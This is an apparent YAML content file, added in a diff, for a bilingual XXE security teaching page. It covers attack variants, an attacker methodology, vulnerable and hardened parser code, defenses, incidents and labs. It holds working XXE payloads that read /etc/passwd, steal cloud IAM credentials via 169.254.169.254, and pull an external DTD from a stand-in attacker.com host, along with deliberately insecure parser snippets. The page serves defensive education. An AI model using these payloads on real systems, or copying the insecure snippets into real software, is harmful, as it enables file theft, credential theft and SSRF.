@@ -1,0 +1,522 @@
+meta:
+  id: xxe
+  threatId: cat_1_research11
+  severity: Critical
+  color: '#0ea5e9'
+  colorRgb: 14,165,233
+  cwe: CWE-611
+  cvss: '7.5'
+  standard: OWASP A05:2021
+hero:
+  titleMain: 'XML External '
+  titleGrad: Entity
+  titleTail: ' (XXE)'
+  topbar: XML External Entity (XXE) Injection
+  lead:
+    en: XXE happens when an XML parser resolves external entities from untrusted input — a DOCTYPE declaring <!ENTITY x SYSTEM "file:///etc/passwd"> makes the parser fetch that file and embed it inline. Parameter entities and an attacker-hosted external DTD extend this to blind, out-of-band exfiltration even with zero reflection, and the same entity mechanism can point at internal URLs for SSRF or cloud metadata credential theft. A base file-read scenario scores CVSS 7.5, but real chains (XXE → SSRF → admin takeover, as in Zimbra CVE-2019-9670) escalate to full RCE.
+    pl: XXE zdarza się, gdy parser XML rozwiązuje encje zewnętrzne z niezaufanego wejścia — DOCTYPE deklarujący <!ENTITY x SYSTEM "file:///etc/passwd"> powoduje że parser pobiera ten plik i wstawia go inline. Encje parametryczne i zewnętrzny DTD hostowany przez atakującego rozszerzają to na ślepą eksfiltrację out-of-band nawet bez żadnego odbicia, a ten sam mechanizm encji może wskazywać na wewnętrzne URL-e dla SSRF lub kradzieży poświadczeń z metadanych chmury. Podstawowy scenariusz odczytu pliku ocenia się na CVSS 7.5, ale realne łańcuchy (XXE → SSRF → przejęcie admina, jak w Zimbra CVE-2019-9670) eskalują do pełnego RCE.
+  metrics:
+  - k: CWE-611
+    v:
+      en: Weakness ID
+      pl: ID słabości
+  - k: '7.5'
+    v: CVSS · High
+  - k: A05:2021
+    v: OWASP Top 10
+  - k: '7'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: OWASP A05:2021
+    url: https://owasp.org/Top10/2021/A05_2021-Security_Misconfiguration/
+  - label: CWE-611 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/611.html
+  - label: PortSwigger Academy
+    url: https://portswigger.net/web-security/xxe
+  - label: OWASP XXE Prevention Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+sectionOrder:
+- overview
+- types
+- code
+- langrisks
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- labs
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: langrisks
+  en: Parser risks
+  pl: Ryzyka parserów
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: labs
+  en: Practice labs
+  pl: Laby praktyczne
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Seven ways the same entity-resolution mechanism is abused — from a direct file read to a fully blind, out-of-band exfiltration chain.
+      pl: Siedem sposobów, w jakie ten sam mechanizm rozwiązywania encji jest nadużywany — od bezpośredniego odczytu pliku po w pełni ślepy łańcuch eksfiltracji out-of-band.
+    items:
+    - name: Classic External Entity File Disclosure
+      sev: high
+      description:
+        en: An external entity references a local file; if its value is reflected in the response, the file content is disclosed directly.
+        pl: Encja zewnętrzna odwołuje się do lokalnego pliku; jeśli jej wartość jest odbita w odpowiedzi, treść pliku jest bezpośrednio ujawniana.
+      payload: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>
+    - name: SSRF via XXE
+      sev: critical
+      description:
+        en: An entity resolves an internal URL or cloud metadata endpoint, forcing the server to issue an outbound request on the attacker's behalf.
+        pl: Encja rozwiązuje wewnętrzny URL lub endpoint metadanych chmury, zmuszając serwer do wysłania żądania wychodzącego w imieniu atakującego.
+      payload: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+    - name: Blind XXE via Out-of-Band Exfiltration
+      sev: critical
+      description:
+        en: 'No reflection needed: an attacker-hosted external DTD uses nested parameter entities to read a file and smuggle its contents into a callback URL.'
+        pl: 'Odbicie niepotrzebne: zewnętrzny DTD hostowany przez atakującego używa zagnieżdżonych encji parametrycznych by odczytać plik i przemycić jego treść do URL callbacku.'
+      payload: <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;  (evil.dtd chains %file; into an HTTP callback)
+    - name: Billion Laughs / Entity Expansion (DoS)
+      sev: medium
+      description:
+        en: Exponentially nested internal entities inflate a tiny document into gigabytes in memory — no external fetch needed, so disabling external entities alone does not stop it.
+        pl: Wykładniczo zagnieżdżone encje wewnętrzne rozdymają maleńki dokument do gigabajtów w pamięci — nie wymaga pobrania zewnętrznego, więc samo wyłączenie encji zewnętrznych tego nie zatrzymuje.
+      payload: <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">  (chained to lol9 ≈ 10^9 expansions)
+    - name: Error-Based Blind XXE
+      sev: medium
+      description:
+        en: When there's no reflection and no outbound network, a malformed external-DTD reference forces a parser error that leaks file content in the error message.
+        pl: Gdy nie ma odbicia ani sieci wychodzącej, zniekształcone odwołanie do zewnętrznego DTD wymusza błąd parsera, który wycieka treść pliku w komunikacie błędu.
+      payload: <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'">"  %eval; %error;
+    - name: XInclude-Based Attack
+      sev: high
+      description:
+        en: Used when DOCTYPE is blocked or the attacker controls only a sub-element (no document root access) — XInclude needs no DTD at all.
+        pl: Używane gdy DOCTYPE jest blokowany lub atakujący kontroluje tylko pod-element (brak dostępu do korzenia dokumentu) — XInclude w ogóle nie wymaga DTD.
+      payload: <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+    - name: XXE via Embedded-XML Uploads (SVG / DOCX / SOAP)
+      sev: high
+      description:
+        en: SVG images, Office Open XML (DOCX/XLSX/PPTX are ZIPs of XML), and SOAP/SAML envelopes all get parsed server-side — inject a DOCTYPE into the inner XML part.
+        pl: Obrazy SVG, Office Open XML (DOCX/XLSX/PPTX to ZIP-y XML) i koperty SOAP/SAML są wszystkie parsowane po stronie serwera — wstrzyknij DOCTYPE do wewnętrznej części XML.
+      payload: <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg><text>&xxe;</text></svg>
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'The same fix everywhere: disable DTD processing / external-entity resolution at the parser level — the one true root-cause fix.'
+      pl: 'Ta sama naprawa wszędzie: wyłącz przetwarzanie DTD / rozwiązywanie encji zewnętrznych na poziomie parsera — jedyna prawdziwa naprawa źródłowa.'
+    languages:
+    - label: Java
+      lang: java
+      vulnerable: '// VULNERABLE — default factory resolves DTDs & external entities
+
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+        Document doc = dbf.newDocumentBuilder().parse(input);'
+      safe: '// SECURE — disallow DOCTYPE entirely (single line is usually enough)
+
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+
+        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+        dbf.setXIncludeAware(false);
+
+        dbf.setExpandEntityReferences(false);
+
+        Document doc = dbf.newDocumentBuilder().parse(input);'
+    - label: Python
+      lang: python
+      vulnerable: '# VULNERABLE — lxml resolves entities and network URIs by default
+
+        from lxml import etree
+
+        root = etree.fromstring(user_xml)'
+      safe: '# SECURE — use defusedxml, which hardens all known XML attack vectors
+
+        from defusedxml.ElementTree import fromstring
+
+        root = fromstring(user_xml)  # blocks external entities, billion laughs, XInclude'
+    - label: PHP
+      lang: php
+      vulnerable: '// VULNERABLE — LIBXML_NOENT forces entity substitution
+
+        $dom = new DOMDocument();
+
+        $dom->loadXML($userXml, LIBXML_NOENT | LIBXML_DTDLOAD);'
+      safe: '// SECURE — omit LIBXML_NOENT/LIBXML_DTDLOAD entirely
+
+        $dom = new DOMDocument();
+
+        $dom->loadXML($userXml);
+
+        // libxml >= 2.9 / PHP >= 8.0 disable external entities by default'
+    - label: C# / .NET
+      lang: csharp
+      vulnerable: '// VULNERABLE (legacy .NET Framework < 4.5.2)
+
+        XmlDocument doc = new XmlDocument();
+
+        doc.LoadXml(userXml);'
+      safe: "// SECURE\nvar settings = new XmlReaderSettings {\n    DtdProcessing = DtdProcessing.Prohibit,\n    XmlResolver = null\n};\nusing var reader = XmlReader.Create(new StringReader(userXml), settings);"
+    - label: Node.js
+      lang: javascript
+      vulnerable: '// VULNERABLE — noent replaces entities, nonet allows network fetch
+
+        const doc = libxml.parseXml(userXml, { noent: true, nonet: false });'
+      safe: '// SECURE — never enable entity substitution; block network and DTD load
+
+        const doc = libxml.parseXml(userXml, { noent: false, nonet: true, dtdload: false });
+
+        // Or use a pure-JS parser (fast-xml-parser, xml2js) — DTD/entities are not processed at all'
+  langRisks:
+    title:
+      en: Parser-specific risks
+      pl: Ryzyka specyficzne dla parserów
+    lead:
+      en: Modern parser versions are increasingly safe by default — real-world XXE mostly comes from legacy runtimes or explicitly re-enabled dangerous flags.
+      pl: Nowoczesne wersje parserów są coraz częściej bezpieczne domyślnie — realny XXE w praktyce pochodzi głównie z legacy runtime'ów lub jawnie ponownie włączonych niebezpiecznych flag.
+    rows:
+    - fw: Java (JAXP/Xerces)
+      api: DocumentBuilderFactory.newInstance()
+      note:
+        en: Resolves DTDs and external entities by default on every JDK version. There is no safe-by-default here — disallow-doctype-decl must be set explicitly on every factory instance.
+        pl: Rozwiązuje DTD i encje zewnętrzne domyślnie na każdej wersji JDK. Nie ma tu bezpiecznego domyślnego zachowania — disallow-doctype-decl musi być ustawione jawnie na każdej instancji fabryki.
+    - fw: PHP (libxml)
+      api: LIBXML_NOENT | LIBXML_DTDLOAD
+      note:
+        en: libxml >= 2.9 (bundled with PHP >= 8.0) disables external entity loading by default — the danger is explicitly passing these two flags, not the library's own default.
+        pl: libxml >= 2.9 (dołączone do PHP >= 8.0) domyślnie wyłącza ładowanie encji zewnętrznych — zagrożeniem jest jawne przekazanie tych dwóch flag, nie domyślne zachowanie samej biblioteki.
+    - fw: .NET Framework / .NET Core
+      api: XmlDocument.XmlResolver
+      note:
+        en: Safe by default since .NET Framework 4.5.2 and in all of .NET Core/.NET 5+ (XmlResolver is null, DtdProcessing is Prohibit). Only pre-4.5.2 Framework code is at risk.
+        pl: Bezpieczne domyślnie od .NET Framework 4.5.2 i we wszystkich .NET Core/.NET 5+ (XmlResolver jest null, DtdProcessing to Prohibit). Zagrożony jest tylko kod na Framework sprzed 4.5.2.
+    - fw: Python (xml.etree)
+      api: xml.etree.ElementTree
+      note:
+        en: The stdlib parser doesn't expand external entities, but has no built-in billion-laughs protection on older versions. Use defusedxml regardless — it's the officially recommended wrapper.
+        pl: Parser stdlib nie rozwija encji zewnętrznych, ale nie ma wbudowanej ochrony przed billion-laughs na starszych wersjach. Używaj defusedxml niezależnie — to oficjalnie rekomendowany wrapper.
+    - fw: Node.js (libxmljs)
+      api: parseXml(xml, {noent, nonet})
+      note:
+        en: The libxml2 binding inherits libxml's danger flags. Pure-JS parsers (fast-xml-parser, xml2js) don't process DTDs/entities at all — prefer them when full XML spec compliance isn't required.
+        pl: Binding libxml2 dziedziczy niebezpieczne flagi libxml. Czyste parsery JS (fast-xml-parser, xml2js) w ogóle nie przetwarzają DTD/encji — preferuj je gdy pełna zgodność ze spec XML nie jest wymagana.
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from finding an XML-accepting endpoint to SSRF or full data exfiltration.
+      pl: Jak atakujący przechodzi od znalezienia endpointu akceptującego XML do SSRF lub pełnej eksfiltracji danych.
+    steps:
+    - title:
+        en: Find XML-accepting surfaces
+        pl: Znajdź powierzchnie akceptujące XML
+      description:
+        en: 'Enumerate SOAP/REST/XML-RPC endpoints, SAML SSO flows, and — critically — file uploads that embed XML: SVG, DOCX/XLSX/PPTX, RSS/sitemap imports.'
+        pl: 'Wylicz endpointy SOAP/REST/XML-RPC, przepływy SAML SSO i — kluczowo — uploady plików osadzających XML: SVG, DOCX/XLSX/PPTX, importy RSS/sitemap.'
+    - title:
+        en: Baseline and coerce content-type
+        pl: Ustal punkt odniesienia i wymuś content-type
+      description:
+        en: Confirm the parser processes DOCTYPE with a benign internal entity. On JSON endpoints, try switching Content-Type to XML — many frameworks parse both.
+        pl: Potwierdź że parser przetwarza DOCTYPE z niegroźną encją wewnętrzną. Na endpointach JSON, spróbuj przełączyć Content-Type na XML — wiele frameworków parsuje oba.
+    - title:
+        en: Test in-band file disclosure
+        pl: Testuj odczyt pliku in-band
+      description:
+        en: Inject a classic file:// entity and check if its value is reflected in the response — confirmed in-band XXE.
+        pl: Wstrzyknij klasyczną encję file:// i sprawdź czy jej wartość jest odbita w odpowiedzi — potwierdzony XXE in-band.
+    - title:
+        en: Escalate to blind/OOB
+        pl: Eskaluj do ślepego/OOB
+      description:
+        en: Point a parameter entity at an attacker-controlled external DTD; a callback hit (Burp Collaborator/interactsh) confirms entity resolution even with zero reflection.
+        pl: Skieruj encję parametryczną na zewnętrzny DTD kontrolowany przez atakującego; trafienie callbacku (Burp Collaborator/interactsh) potwierdza rozwiązywanie encji nawet bez żadnego odbicia.
+    - title:
+        en: Exfiltrate via nested parameter entities
+        pl: Eksfiltruj przez zagnieżdżone encje parametryczne
+      description:
+        en: The hosted external DTD reads a file and appends its content to the callback URL (HTTP if egress allowed, DNS-label encoding as fallback).
+        pl: Hostowany zewnętrzny DTD odczytuje plik i dokleja jego treść do URL callbacku (HTTP jeśli ruch wychodzący dozwolony, kodowanie w etykiecie DNS jako fallback).
+    - title:
+        en: Bypass DOCTYPE filtering
+        pl: Obejdź filtrowanie DOCTYPE
+      description:
+        en: If DOCTYPE itself is blocked, pivot to XInclude (needs no DTD) or encoding tricks (UTF-16/UTF-7).
+        pl: Jeśli sam DOCTYPE jest blokowany, przejdź na XInclude (nie wymaga DTD) lub sztuczki kodowania (UTF-16/UTF-7).
+    - title:
+        en: Pivot to SSRF and cloud metadata
+        pl: Przejdź do SSRF i metadanych chmury
+      description:
+        en: Aim entities at internal services and 169.254.169.254 (or GCP/Azure equivalents) to harvest IAM credentials and map the internal network.
+        pl: Skieruj encje na wewnętrzne usługi i 169.254.169.254 (lub odpowiedniki GCP/Azure), by wykraść poświadczenia IAM i zmapować sieć wewnętrzną.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Disabling DTD/external-entity processing is the one true root-cause fix — everything else is defense-in-depth or situational.
+      pl: Wyłączenie przetwarzania DTD/encji zewnętrznych to jedyna prawdziwa naprawa źródłowa — reszta to obrona w głąb lub rozwiązania sytuacyjne.
+    items:
+    - rank: 1
+      eff: 98
+      kind: primary
+      label:
+        en: Disable DTD / external-entity processing
+        pl: Wyłączenie przetwarzania DTD / encji zewnętrznych
+      note:
+        en: Per-parser configuration (disallow-doctype-decl, resolve_entities=False, XmlResolver=null). Must be applied to every parser instance in the codebase and its dependencies — the definitive fix, also stops billion-laughs if DOCTYPE is disallowed entirely.
+        pl: Konfiguracja per-parser (disallow-doctype-decl, resolve_entities=False, XmlResolver=null). Musi być zastosowana do każdej instancji parsera w kodzie i zależnościach — ostateczna naprawa, zatrzymuje też billion-laughs jeśli DOCTYPE jest całkowicie zablokowany.
+    - rank: 2
+      eff: 90
+      kind: strong
+      label:
+        en: Use a simpler format (JSON) instead of XML
+        pl: Użycie prostszego formatu (JSON) zamiast XML
+      note:
+        en: Eliminates the attack class entirely where feasible. Not always possible — legacy SOAP/SAML and Office formats mandate XML.
+        pl: Eliminuje całą klasę ataku tam gdzie to wykonalne. Nie zawsze możliwe — legacy SOAP/SAML i formaty Office wymagają XML.
+    - rank: 3
+      eff: 82
+      kind: strong
+      label:
+        en: Patch/update parser libraries, rely on safe defaults
+        pl: Aktualizacja bibliotek parsera, poleganie na bezpiecznych domyślnych
+      note:
+        en: Modern libxml2 (>=2.9), .NET (>=4.5.2), and PHP (>=8.0) ship safe defaults. Doesn't help code that explicitly re-enables dangerous options.
+        pl: Nowoczesne libxml2 (>=2.9), .NET (>=4.5.2) i PHP (>=8.0) mają bezpieczne wartości domyślne. Nie pomaga kodowi jawnie ponownie włączającemu niebezpieczne opcje.
+    - rank: 4
+      eff: 58
+      kind: mitigation
+      label:
+        en: Allow-list / schema (XSD) validation
+        pl: Walidacja allowlist / schematu (XSD)
+      note:
+        en: 'Rejects unexpected structure, but validation itself runs through an XML parser — must be combined with #1, not a substitute for it.'
+        pl: 'Odrzuca nieoczekiwaną strukturę, ale sama walidacja przechodzi przez parser XML — musi być połączona z #1, nie jest jego zastępstwem.'
+    - rank: 5
+      eff: 50
+      kind: mitigation
+      label:
+        en: Network egress filtering
+        pl: Filtrowanie ruchu wychodzącego
+      note:
+        en: Blocks OOB HTTP exfiltration and SSRF-to-metadata, but doesn't stop in-band local file disclosure or billion-laughs DoS. Also blunts DNS-based exfiltration only if DNS egress is also controlled.
+        pl: Blokuje eksfiltrację OOB przez HTTP i SSRF-do-metadanych, ale nie zatrzymuje odczytu pliku lokalnego in-band ani DoS billion-laughs. Ogranicza też eksfiltrację przez DNS tylko jeśli ruch wychodzący DNS jest również kontrolowany.
+    - rank: 6
+      eff: 30
+      kind: weak
+      label:
+        en: WAF signatures
+        pl: Sygnatury WAF
+      note:
+        en: Catches obvious <!DOCTYPE/<!ENTITY strings but is bypassed by encoding, injection into inner ZIP/office parts, XInclude (no DOCTYPE keyword), or parameter-entity indirection.
+        pl: Wyłapuje oczywiste stringi <!DOCTYPE/<!ENTITY, ale jest omijane przez kodowanie, wstrzyknięcie do wewnętrznych części ZIP/office, XInclude (bez słowa kluczowego DOCTYPE), lub pośrednictwo encji parametrycznych.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: From a $33,500 Facebook bounty to a chained XXE→SSRF→admin-takeover exploited in the wild against Zimbra mail servers.
+      pl: Od nagrody $33,500 od Facebooka po łańcuch XXE→SSRF→przejęcie admina eksploitowany w sieci przeciw serwerom pocztowym Zimbra.
+    items:
+    - org: Facebook (OpenID handler)
+      year: 2014
+      impact: $33,500 bounty
+      cost: File read → SSRF
+      description:
+        en: 'Researcher Reginaldo Silva found an XXE in a PHP page handling OpenID authentication, reading /etc/passwd and escalating to an SSRF primitive reaching internal services — Facebook''s largest bounty payout at the time. Note: this is file-read/SSRF, not a private-key leak as sometimes mischaracterized.'
+        pl: 'Badacz Reginaldo Silva znalazł XXE w stronie PHP obsługującej uwierzytelnianie OpenID, odczytując /etc/passwd i eskalując do prymitywu SSRF sięgającego wewnętrznych usług — największa wypłata bounty Facebooka w tamtym czasie. Uwaga: to odczyt pliku/SSRF, nie wyciek klucza prywatnego, jak czasem błędnie się to opisuje.'
+    - org: Uber (Code42 CrashPlan backup)
+      year: 2016
+      impact: $9,000 bounty
+      cost: Blind OOB XXE
+      description:
+        en: 'A blind, out-of-band XXE in the third-party CrashPlan backup software used by Uber let a researcher extract data via an OOB channel with zero in-band reflection — patched May 2016, publicly disclosed via HackerOne report #154096 in 2017.'
+        pl: 'Ślepy, out-of-band XXE w oprogramowaniu backupowym CrashPlan strony trzeciej używanym przez Ubera pozwolił badaczowi wyekstrahować dane przez kanał OOB bez żadnego odbicia in-band — załatane w maju 2016, publicznie ujawnione przez raport HackerOne #154096 w 2017.'
+    - org: Zimbra Collaboration Suite
+      year: 2019
+      impact: CVE-2019-9670, exploited in the wild
+      cost: XXE → SSRF → admin RCE
+      description:
+        en: XXE in the mailboxd Autodiscover servlet read a config file containing the zimbra LDAP password, chained into an SSRF (CVE-2019-9621) to the admin port, then an admin cookie and JSP webshell — full RCE, actively exploited in real campaigns. Independently researched by one of three ModelArena teams; included for its unusually complete real-world exploitation chain, not because all three teams converged on it (they did not — this is the one item in this deep-dive without 3-way consensus, flagged explicitly per this project's disclosure standard).
+        pl: XXE w servlecie Autodiscover mailboxd odczytywał plik konfiguracyjny zawierający hasło LDAP konta zimbra, połączone w SSRF (CVE-2019-9621) do portu admina, potem ciasteczko admina i webshell JSP — pełne RCE, aktywnie eksploitowane w realnych kampaniach. Zbadane niezależnie przez jeden z trzech zespołów ModelArena; dołączone ze względu na niezwykle kompletny realny łańcuch eksploatacji, nie dlatego że wszystkie trzy zespoły się na nim zgodziły (nie zgodziły się — to jedyna pozycja w tym deep-dive bez konsensusu 3-drożnego, jawnie oznaczona zgodnie ze standardem ujawniania tego projektu).
+    inlineSources:
+    - label: Facebook XXE write-up
+      url: https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution
+    - label: 'Uber HackerOne #154096'
+      url: https://hackerone.com/reports/154096
+    - label: CVE-2019-9670 (Zimbra)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2019-9670
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis flags insecure parser configuration; out-of-band interaction tools are essential for confirming blind XXE with zero reflection.
+      pl: Analiza statyczna oznacza niebezpieczną konfigurację parsera; narzędzia interakcji out-of-band są niezbędne do potwierdzenia ślepego XXE bez żadnego odbicia.
+    sast:
+    - - Semgrep
+      - Rules for insecure DocumentBuilderFactory/lxml/libxml_disable_entity_loader config
+    - - CodeQL
+      - Dataflow queries for untrusted XML reaching unhardened parsers
+    - - SonarQube
+      - '"XML parsers should not be vulnerable to XXE" rule across Java/C#/PHP/Python'
+    - - Checkmarx / Fortify SCA
+      - Dedicated XXE query set across enterprise language stacks
+    dast:
+    - - Burp Suite
+      - Active scanner + Collaborator for blind/OOB XXE confirmation
+    - - OWASP ZAP
+      - Active scan rules for XXE plus OAST add-on for blind detection
+    - - XXEinjector
+      - Specialized tool automating file retrieval and OOB exfiltration
+    - - interactsh / Nuclei
+      - Open-source OOB interaction server + templated XXE detection
+    note:
+      en: <strong>Key signal:</strong> grep for <code>DocumentBuilderFactory.newInstance()</code>, <code>LIBXML_NOENT</code>, <code>resolve_entities=True</code>, and any <code>XmlResolver</code> not explicitly set to null — these are the dangerous parser defaults that matter.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj <code>DocumentBuilderFactory.newInstance()</code>, <code>LIBXML_NOENT</code>, <code>resolve_entities=True</code>, i każdego <code>XmlResolver</code> niewyraźnie ustawionego na null — to niebezpieczne domyślne ustawienia parserów, które mają znaczenie.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: XXE was its own OWASP category in 2017 — it was folded into Security Misconfiguration in 2021, a detail worth getting right in reports.
+      pl: XXE było osobną kategorią OWASP w 2017 — w 2021 zostało wchłonięte przez Security Misconfiguration, szczegół warty poprawnego ujęcia w raportach.
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-611 — primary entry (Improper Restriction of XML External Entity Reference)
+      - CWE-827 — Improper Control of Document Type Definition
+      - CWE-776 — Improper Restriction of Recursive Entity References (Billion Laughs)
+      - CWE-918 — Server-Side Request Forgery (the SSRF pivot outcome)
+    - std: OWASP
+      items:
+      - A05:2021 — Security Misconfiguration (XXE was its own A4:2017 category, merged in 2021)
+      - ASVS V5 — Validation, Sanitization & Encoding
+      - OWASP XXE Prevention Cheat Sheet
+    - std: PCI DSS v4.0
+      items:
+      - 6.2.4 — address common software attacks including injection-class flaws
+      - 6.3 — identify and address vulnerabilities in bespoke/custom software (no XXE-specific clause exists)
+    - std: CAPEC
+      items:
+      - CAPEC-221 — Data Serialization External Entities Blowup
+      - CAPEC-197 — XML Entity Expansion
+    inlineSources:
+    - label: CWE-611 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/611.html
+    - label: OWASP A05:2021
+      url: https://owasp.org/Top10/2021/A05_2021-Security_Misconfiguration/
+    - label: PCI DSS v4.0
+      url: https://www.pcisecuritystandards.org/document_library/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm active XXE exploitation, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji XXE, przejdź tę listę od góry.
+    steps:
+    - en: Identify which files were read by correlating access/error logs with the XML payload
+      pl: Ustal które pliki zostały odczytane, korelując logi dostępu/błędów z ładunkiem XML
+    - en: Rotate any credentials/config secrets that could have been exposed (LDAP passwords, API keys, cloud IAM tokens)
+      pl: Zrotuj wszelkie poświadczenia/sekrety konfiguracyjne, które mogły zostać ujawnione (hasła LDAP, klucze API, tokeny IAM chmury)
+    - en: Check whether the XXE was chained into SSRF against internal services or cloud metadata
+      pl: Sprawdź czy XXE zostało połączone w łańcuch z SSRF przeciw wewnętrznym usługom lub metadanym chmury
+    - en: 'Patch the root cause: disable DTD/external-entity processing on every parser instance, not just the exploited one'
+      pl: 'Załataj przyczynę źródłową: wyłącz przetwarzanie DTD/encji zewnętrznych na każdej instancji parsera, nie tylko na tej wykorzystanej'
+    - en: Audit file-upload features (SVG, DOCX/XLSX, SOAP/SAML) for the same unguarded parser pattern
+      pl: Przeaudytuj funkcje uploadu plików (SVG, DOCX/XLSX, SOAP/SAML) pod kątem tego samego niezabezpieczonego wzorca parsera
+    - en: Sweep sibling endpoints with Semgrep/CodeQL for insecure parser factory configuration
+      pl: Przeskanuj bliźniacze endpointy Semgrep/CodeQL pod kątem niebezpiecznej konfiguracji fabryki parsera
+    - en: Notify per applicable compliance obligations
+      pl: Powiadom zgodnie z obowiązującymi wymogami zgodności
+  labs:
+    title:
+      en: Practice labs
+      pl: Laby praktyczne
+    lead:
+      en: Curated external labs to practice this exact attack — self-reported, not verified by Code Guardian.
+      pl: Kuratorowane zewnętrzne laby do przećwiczenia tego ataku — samodzielnie zgłaszane, nie weryfikowane przez Code Guardian.
+    items:
+    - variant: Classic External Entity File Disclosure
+      provider: PortSwigger Web Security Academy
+      label: Exploiting XXE using external entities to retrieve files
+      url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+    - variant: SSRF via XXE
+      provider: PortSwigger Web Security Academy
+      label: Exploiting XXE to perform SSRF attacks
+      url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+    - variant: Blind XXE via Out-of-Band Exfiltration
+      provider: PortSwigger Web Security Academy
+      label: Blind XXE with out-of-band interaction
+      url: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
+    - variant: XInclude-Based Attack
+      provider: PortSwigger Web Security Academy
+      label: Exploiting XInclude to retrieve files
+      url: https://portswigger.net/web-security/xxe/lab-xinclude-attack
+    - variant: XXE via Embedded-XML Uploads (SVG / DOCX / SOAP)
+      provider: PortSwigger Web Security Academy
+      label: Exploiting XXE via image file upload
+      url: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: OWASP A05:2021 Security Misconfiguration
+      url: https://owasp.org/Top10/2021/A05_2021-Security_Misconfiguration/
+    - label: CWE-611 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/611.html
+    - label: OWASP XXE Prevention Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+    - label: PortSwigger — XXE
+      url: https://portswigger.net/web-security/xxe
+    - label: NIST NVD — CWE-611
+      url: https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-611
+    - label: CVE-2019-9670 (Zimbra)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2019-9670
+    - label: 'Uber HackerOne #154096'
+      url: https://hackerone.com/reports/154096
